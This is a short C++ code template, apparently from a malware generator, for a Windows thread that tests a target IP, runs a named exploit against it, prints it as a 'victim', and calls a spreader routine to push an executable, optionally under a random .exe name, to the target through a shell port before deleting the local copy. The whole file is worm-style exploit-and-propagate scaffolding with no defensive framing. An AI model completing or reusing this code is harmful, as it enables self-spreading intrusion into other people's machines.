

DWORD WINAPI exploit_[exploitName](LPVOID lpParam) {
	PthreadData pData;
	pData = (PthreadData)lpParam;
	int sock;
	sock = isTarget_[exploitName](pData->strIP);
	if (sock) {
		std::string tmpFileName ="";
		tmpFileName = fileName;
		if (isRandomName) {
		tmpFileName = RandomStr(8) + ".exe";
		//[randomeNameModule](tmpFileName);
		}
		printf("victim: %s\n", pData->strIP);
		[exploitName](sock, pData->strIP);
		int a;
		a = [Spreader](pData->strIP, pData->shellPort, tmpFileName);
		//printf("Done exploti!");
		if (isRandomName)
		{
			//delete new exe
			std::string NewExePath = (std::string)fullName;
			NewExePath = NewExePath.substr(0, NewExePath.find_last_of("\\"));
			NewExePath += "\\" + tmpFileName;
			DeleteFileA(NewExePath.c_str());
		}
		printf("DEBUG %d\n", a);
	}
	else
	{
		printf("ip: %s can't exploit!\n", pData->strIP);
	}
	return 0;
}